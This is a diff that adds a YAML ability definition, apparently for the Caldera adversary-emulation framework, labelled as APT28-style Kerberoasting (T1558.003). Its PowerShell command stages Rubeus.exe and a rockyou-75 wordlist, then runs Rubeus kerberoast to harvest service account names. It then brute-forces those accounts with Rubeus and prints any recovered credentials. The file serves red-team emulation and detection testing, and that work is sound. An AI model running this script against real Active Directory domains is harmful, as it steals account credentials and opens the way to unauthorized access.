@@ -1,0 +1,45 @@
+- tactic: privilege-escalation
+  technique_name: 'Steal or Forge Kerberos Tickets: Kerberoasting'
+  technique_id: T1558.003
+  name: APT28 - Rubeus Kerberoasting [RAYSON]
+  description: Uses rubeus to kerberoast and brute force potential user entry points
+    in an Active Directory Domain
+  executors:
+  - name: psh
+    platform: windows
+    command: "mv Rubeus.exe #{host.dir.staged};\nmv rockyou-75.txt #{host.dir.staged};\n\
+      cd #{host.dir.staged};\n$m = .\\Rubeus.exe kerberoast /nowrap | Select-String\
+      \ -Pattern \"SamAccountName\\s+:\\s(?<target>\\S+)\" -List;  $username = $m.Matches.groups\
+      \ | ? {$_.Name -eq 'target' } | Select-Object -ExpandProperty Value; echo $username\
+      \ > usernames.txt; \n\n$b = .\\Rubeus.exe brute /users:usernames.txt /passwords:rockyou-75.txt\
+      \ /noticket | Select-String -Pattern \"STUPENDOUS =>\\s(?<target>\\S+)\" -List;\
+      \  $credentials = $b.Matches.groups | ? {$_.Name -eq 'target' } | Select-Object\
+      \ -ExpandProperty Value;if ($credentials.Length -eq 0) {echo 'Brute force unsuccessful'}else{echo\
+      \ $credentials};"
+    code: null
+    language: null
+    build_target: null
+    payloads:
+    - rockyou-75.txt
+    - Rubeus.exe
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup:
+    - ''
+    variations: []
+    additional_info: {}
+  requirements:
+  - module: plugins.stockpile.app.requirements.paw_provenance
+    relationship_match:
+    - source: host.dir.staged
+  privilege: ''
+  repeatable: false
+  buckets: []
+  additional_info:
+    cleanup: '[]'
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: false
+  id: e1add6c1-74bc-402e-9d1f-e04d284588b9
